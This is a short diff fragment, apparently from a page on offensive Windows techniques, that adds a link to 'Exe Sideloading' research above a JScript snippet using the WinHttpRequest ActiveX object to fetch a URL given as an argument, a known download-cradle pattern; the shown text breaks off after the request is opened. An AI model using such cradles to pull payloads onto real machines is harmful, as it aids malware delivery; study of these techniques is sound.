@@ -5,6 +5,8 @@
   </body>
 </p>
 
+https://github.com/jreegun/Researches/tree/master/Exe%20Sideloading
+
 ````
 var  WinHttpReq  =  new  ActiveXObject ( "WinHttp.WinHttpRequest.5.1" ) ; 
 WinHttpReq . Open ( "GET" ,  WScript . Arguments ( 0 ) ,  /*async=*/ false ) ; 
